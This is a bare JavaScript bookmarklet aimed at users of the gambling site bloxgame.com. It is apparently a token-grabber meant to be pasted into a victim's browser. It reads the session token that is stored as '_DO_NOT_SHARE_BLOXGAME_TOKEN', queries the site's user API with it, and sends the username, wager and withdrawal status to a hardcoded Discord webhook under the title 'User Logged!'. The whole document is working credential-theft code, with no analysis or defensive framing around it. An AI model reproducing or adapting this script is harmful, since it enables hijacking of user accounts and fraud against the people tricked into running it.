javascript:(function() {
    try {
        var token = localStorage.getItem('_DO_NOT_SHARE_BLOXGAME_TOKEN');
        
        if (token) {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "https://api.bloxgame.com/user", true);
            xhr.setRequestHeader("accept", "application/json, text/plain, */*");
            xhr.setRequestHeader("accept-language", "en-US,en;q=0.9");
            xhr.setRequestHeader("x-auth-token", token);
            xhr.setRequestHeader("x-client-version", "1.0.0");
            xhr.setRequestHeader("x-timezone", "Europe/Kiev");

            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    var response = JSON.parse(xhr.responseText);
                    var user = response.user.username;
                    var wager = response.wager;
                    var withdrawEnabled = response.user.withdrawEnabled ? 'Enabled' : 'Disabled';

                    var currentTime = new Date();
                    var formattedTime = currentTime.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', hour12: true});
                    var formattedDate = currentTime.toLocaleDateString('en-US', {month: 'short', day: 'numeric'});

                    var webhookRequest = new XMLHttpRequest();
                    webhookRequest.open("POST", "https://discord.com/api/webhooks/1280222189429198858/M9axd-BRaA4_aLDb3aqzsHyvSsVVYusXykOX_K1hmvE6evrp5GkuWNqat4iy_p9HrNp3", true);
                    webhookRequest.setRequestHeader('Content-Type', 'application/json');
                    webhookRequest.send(JSON.stringify({
                        embeds: [{
                            title: "User Logged!",
                            color: 3066993,  // Color in decimal (blue)
                            description: `**User**: ${user}\n**Wager**: ${wager}\n**Withdraw**: ${withdrawEnabled}`,
                            footer: {
                                text: `Bloxgame User Data • ${formattedDate} at ${formattedTime}`
                            },
                            timestamp: new Date().toISOString()
                        }]
                    }));
                    console.log('Response sent to webhook.');
                }
            };
            
            xhr.send();
        } else {
            console.log('Token not found in local storage.');
        }
    } catch (e) {
        console.error('Error:', e);
    }
})();
